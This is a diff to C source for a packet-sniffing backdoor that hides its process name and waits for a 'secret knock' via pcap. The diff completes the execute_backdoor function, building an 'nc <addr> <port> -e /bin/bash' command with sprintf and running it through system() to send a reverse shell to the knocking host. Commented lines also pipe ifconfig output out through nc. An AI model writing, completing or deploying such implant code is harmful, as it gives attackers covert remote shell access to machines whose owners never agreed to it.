@@ -51,9 +51,9 @@ unsigned char lock = 0b000;
 
 //Function Prototypes
 void mask_application(char *name);
-void check_lock(int addr, int port);
+void check_lock(char *addr, int port);
 void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
-void execute_backdoor(int addr, int port);
+void execute_backdoor(char *addr, int port);
 int send_info(char buffer[]);
 
 /*-----------------------------------------------------------------------------------------------
@@ -76,7 +76,7 @@ void mask_application(char *name)
 	setgid(0);
 }
 
-void check_lock(int addr, int port)
+void check_lock(char *addr, int port)
 {
 	if(!((lock + 1) & ((1 << 3) - 1))) {
 		execute_backdoor(addr, port);
@@ -166,13 +166,15 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 --
 -- NOTES:      Process incoming packets to look for secret knock.
 --------------------------------------------------------------------------------------------------*/
-void execute_backdoor(int addr, int port)
+void execute_backdoor(char *addr, int port)
 {
 	char buffer[256];
 
+	sprintf(buffer, "nc %s %d -e /bin/bash", addr, port);
 	printf("executing...\n");
 	// send shell to client
-	//system("nc %s %d -e /bin/bash", addr, port);
+	system(buffer);
+	lock = 0;
 	//system("ifconfig << info.txt");
 	//system("nc %s %d -e < info.txt", addr, port);
 }
